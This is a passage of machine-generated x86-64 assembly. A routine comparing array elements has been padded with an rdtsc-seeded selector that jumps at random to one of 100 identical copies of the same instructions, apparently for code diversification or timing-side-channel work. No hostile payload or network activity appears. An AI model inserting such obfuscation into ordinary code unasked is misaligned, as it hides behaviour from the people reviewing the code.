	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 35
.LreadByte_win1_var35:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 36
.LreadByte_win1_var36:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 37
.LreadByte_win1_var37:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 38
.LreadByte_win1_var38:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 39
.LreadByte_win1_var39:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 40
.LreadByte_win1_var40:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 41
.LreadByte_win1_var41:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 42
.LreadByte_win1_var42:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 43
.LreadByte_win1_var43:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 44
.LreadByte_win1_var44:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 45
.LreadByte_win1_var45:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 46
.LreadByte_win1_var46:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 47
.LreadByte_win1_var47:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 48
.LreadByte_win1_var48:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 49
.LreadByte_win1_var49:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 50
.LreadByte_win1_var50:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 51
.LreadByte_win1_var51:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 52
.LreadByte_win1_var52:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 53
.LreadByte_win1_var53:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 54
.LreadByte_win1_var54:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 55
.LreadByte_win1_var55:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 56
.LreadByte_win1_var56:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 57
.LreadByte_win1_var57:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 58
.LreadByte_win1_var58:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 59
.LreadByte_win1_var59:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 60
.LreadByte_win1_var60:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 61
.LreadByte_win1_var61:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 62
.LreadByte_win1_var62:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 63
.LreadByte_win1_var63:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 64
.LreadByte_win1_var64:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 65
.LreadByte_win1_var65:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 66
.LreadByte_win1_var66:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 67
.LreadByte_win1_var67:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 68
.LreadByte_win1_var68:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 69
.LreadByte_win1_var69:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 70
.LreadByte_win1_var70:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 71
.LreadByte_win1_var71:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 72
.LreadByte_win1_var72:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 73
.LreadByte_win1_var73:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 74
.LreadByte_win1_var74:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 75
.LreadByte_win1_var75:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 76
.LreadByte_win1_var76:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 77
.LreadByte_win1_var77:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 78
.LreadByte_win1_var78:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 79
.LreadByte_win1_var79:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 80
.LreadByte_win1_var80:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 81
.LreadByte_win1_var81:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 82
.LreadByte_win1_var82:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 83
.LreadByte_win1_var83:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 84
.LreadByte_win1_var84:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 85
.LreadByte_win1_var85:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 86
.LreadByte_win1_var86:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 87
.LreadByte_win1_var87:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 88
.LreadByte_win1_var88:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 89
.LreadByte_win1_var89:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 90
.LreadByte_win1_var90:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 91
.LreadByte_win1_var91:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 92
.LreadByte_win1_var92:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 93
.LreadByte_win1_var93:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 94
.LreadByte_win1_var94:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 95
.LreadByte_win1_var95:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 96
.LreadByte_win1_var96:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 97
.LreadByte_win1_var97:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 98
.LreadByte_win1_var98:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
## Variant 99
.LreadByte_win1_var99:
	popq	%rax
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	jmp	.LreadByte_win1_continue
.LreadByte_win1_continue:
	movslq	-1080(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_28
LBB3_27:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	movl	%eax, -1080(%rbp)
LBB3_28:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_29
LBB3_29:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_30
LBB3_30:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_21
LBB3_31:                                ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	movl	-1040(%rbp,%rcx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win0_var0
	cmpl	$1, %eax
	je	.LreadByte_win0_var1
	cmpl	$2, %eax
	je	.LreadByte_win0_var2
	cmpl	$3, %eax
	je	.LreadByte_win0_var3
	cmpl	$4, %eax
	je	.LreadByte_win0_var4
	cmpl	$5, %eax
	je	.LreadByte_win0_var5
	cmpl	$6, %eax
	je	.LreadByte_win0_var6
	cmpl	$7, %eax
	je	.LreadByte_win0_var7
	cmpl	$8, %eax
	je	.LreadByte_win0_var8
	cmpl	$9, %eax
	je	.LreadByte_win0_var9
	cmpl	$10, %eax
	je	.LreadByte_win0_var10
	cmpl	$11, %eax
	je	.LreadByte_win0_var11
	cmpl	$12, %eax
	je	.LreadByte_win0_var12
	cmpl	$13, %eax
	je	.LreadByte_win0_var13
	cmpl	$14, %eax
	je	.LreadByte_win0_var14
	cmpl	$15, %eax
	je	.LreadByte_win0_var15
	cmpl	$16, %eax
	je	.LreadByte_win0_var16
	cmpl	$17, %eax
	je	.LreadByte_win0_var17
	cmpl	$18, %eax
	je	.LreadByte_win0_var18
	cmpl	$19, %eax
	je	.LreadByte_win0_var19
	cmpl	$20, %eax
	je	.LreadByte_win0_var20
	cmpl	$21, %eax
	je	.LreadByte_win0_var21
	cmpl	$22, %eax
	je	.LreadByte_win0_var22
	cmpl	$23, %eax
	je	.LreadByte_win0_var23
	cmpl	$24, %eax
	je	.LreadByte_win0_var24
	cmpl	$25, %eax
	je	.LreadByte_win0_var25
	cmpl	$26, %eax
	je	.LreadByte_win0_var26
	cmpl	$27, %eax
	je	.LreadByte_win0_var27
	cmpl	$28, %eax
	je	.LreadByte_win0_var28
	cmpl	$29, %eax
	je	.LreadByte_win0_var29
	cmpl	$30, %eax
	je	.LreadByte_win0_var30
	cmpl	$31, %eax
	je	.LreadByte_win0_var31
	cmpl	$32, %eax
	je	.LreadByte_win0_var32
	cmpl	$33, %eax
	je	.LreadByte_win0_var33
	cmpl	$34, %eax
	je	.LreadByte_win0_var34
	cmpl	$35, %eax
	je	.LreadByte_win0_var35
	cmpl	$36, %eax
	je	.LreadByte_win0_var36
	cmpl	$37, %eax
	je	.LreadByte_win0_var37
	cmpl	$38, %eax
	je	.LreadByte_win0_var38
	cmpl	$39, %eax
	je	.LreadByte_win0_var39
	cmpl	$40, %eax
	je	.LreadByte_win0_var40
	cmpl	$41, %eax
	je	.LreadByte_win0_var41
	cmpl	$42, %eax
	je	.LreadByte_win0_var42
	cmpl	$43, %eax
	je	.LreadByte_win0_var43
	cmpl	$44, %eax
	je	.LreadByte_win0_var44
	cmpl	$45, %eax
	je	.LreadByte_win0_var45
	cmpl	$46, %eax
	je	.LreadByte_win0_var46
	cmpl	$47, %eax
	je	.LreadByte_win0_var47
	cmpl	$48, %eax
	je	.LreadByte_win0_var48
	cmpl	$49, %eax
	je	.LreadByte_win0_var49
	cmpl	$50, %eax
	je	.LreadByte_win0_var50
	cmpl	$51, %eax
	je	.LreadByte_win0_var51
	cmpl	$52, %eax
	je	.LreadByte_win0_var52
	cmpl	$53, %eax
	je	.LreadByte_win0_var53
	cmpl	$54, %eax
	je	.LreadByte_win0_var54
	cmpl	$55, %eax
	je	.LreadByte_win0_var55
	cmpl	$56, %eax
	je	.LreadByte_win0_var56
	cmpl	$57, %eax
	je	.LreadByte_win0_var57
	cmpl	$58, %eax
	je	.LreadByte_win0_var58
	cmpl	$59, %eax
	je	.LreadByte_win0_var59
	cmpl	$60, %eax
	je	.LreadByte_win0_var60
	cmpl	$61, %eax
	je	.LreadByte_win0_var61
	cmpl	$62, %eax
	je	.LreadByte_win0_var62
	cmpl	$63, %eax
	je	.LreadByte_win0_var63
	cmpl	$64, %eax
	je	.LreadByte_win0_var64
	cmpl	$65, %eax
	je	.LreadByte_win0_var65
	cmpl	$66, %eax
	je	.LreadByte_win0_var66
	cmpl	$67, %eax
	je	.LreadByte_win0_var67
	cmpl	$68, %eax
	je	.LreadByte_win0_var68
	cmpl	$69, %eax
	je	.LreadByte_win0_var69
	cmpl	$70, %eax
	je	.LreadByte_win0_var70
	cmpl	$71, %eax
	je	.LreadByte_win0_var71
	cmpl	$72, %eax
	je	.LreadByte_win0_var72
	cmpl	$73, %eax
	je	.LreadByte_win0_var73
	cmpl	$74, %eax
	je	.LreadByte_win0_var74
	cmpl	$75, %eax
	je	.LreadByte_win0_var75
	cmpl	$76, %eax
	je	.LreadByte_win0_var76
	cmpl	$77, %eax
	je	.LreadByte_win0_var77
	cmpl	$78, %eax
	je	.LreadByte_win0_var78
	cmpl	$79, %eax
	je	.LreadByte_win0_var79
	cmpl	$80, %eax
	je	.LreadByte_win0_var80
	cmpl	$81, %eax
	je	.LreadByte_win0_var81
	cmpl	$82, %eax
	je	.LreadByte_win0_var82
	cmpl	$83, %eax
	je	.LreadByte_win0_var83
	cmpl	$84, %eax
	je	.LreadByte_win0_var84
	cmpl	$85, %eax
	je	.LreadByte_win0_var85
	cmpl	$86, %eax
	je	.LreadByte_win0_var86
	cmpl	$87, %eax
	je	.LreadByte_win0_var87
	cmpl	$88, %eax
	je	.LreadByte_win0_var88
	cmpl	$89, %eax
	je	.LreadByte_win0_var89
	cmpl	$90, %eax
	je	.LreadByte_win0_var90
	cmpl	$91, %eax
	je	.LreadByte_win0_var91
	cmpl	$92, %eax
	je	.LreadByte_win0_var92
	cmpl	$93, %eax
	je	.LreadByte_win0_var93
	cmpl	$94, %eax
	je	.LreadByte_win0_var94
	cmpl	$95, %eax
	je	.LreadByte_win0_var95
	cmpl	$96, %eax
	je	.LreadByte_win0_var96
	cmpl	$97, %eax
	je	.LreadByte_win0_var97
	cmpl	$98, %eax
	je	.LreadByte_win0_var98
	cmpl	$99, %eax
	je	.LreadByte_win0_var99
	jmp	.LreadByte_win0_var0
## Variant 0
.LreadByte_win0_var0:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 1
.LreadByte_win0_var1:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 2
.LreadByte_win0_var2:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 3
.LreadByte_win0_var3:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 4
.LreadByte_win0_var4:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 5
.LreadByte_win0_var5:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 6
.LreadByte_win0_var6:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 7
.LreadByte_win0_var7:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 8
.LreadByte_win0_var8:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 9
.LreadByte_win0_var9:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 10
.LreadByte_win0_var10:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 11
.LreadByte_win0_var11:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
